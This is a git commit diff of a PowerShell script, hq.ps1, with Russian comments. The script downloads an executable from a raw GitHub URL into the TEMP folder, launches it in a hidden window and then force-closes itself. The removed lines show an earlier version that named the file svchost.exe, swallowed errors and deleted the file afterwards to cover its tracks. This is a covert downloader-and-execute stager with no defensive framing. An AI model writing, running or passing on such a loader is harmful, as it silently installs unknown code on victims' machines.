d625d31fea47afa9ae97eafd1567df95289467dc
Simon <roscacristi0791@gmail.com>
2026-07-01 19:11:57 +0300

    Update PowerShell script for downloading and executing

--- hq.ps1
+++ hq.ps1
@@ -1,22 +1,12 @@
 $exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
-$exePath = "$env:TEMP\svchost.exe"
+$exePath = "$env:TEMP\update.exe"
 
-# Принудительно включаем поддержку TLS 1.2 для соединения с GitHub
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# Скачиваем
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
 
-try {
-    # Используем WebClient, он быстрее и менее капризен к настройкам системы, чем Invoke-WebRequest
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($exeUrl, $exePath)
-    
-    # Проверяем, существует ли файл перед запуском
-    if (Test-Path $exePath) {
-        Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue
-    }
-} catch {
-    # Игнорируем ошибки
-}
+# Запускаем
+Start-Process -FilePath $exePath -WindowStyle Hidden
 
-# Удаляем следы запуска из истории и закрываем процесс
-Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
+# Закрываемся
+Start-Sleep -Seconds 2
 Stop-Process -Id $PID -Force
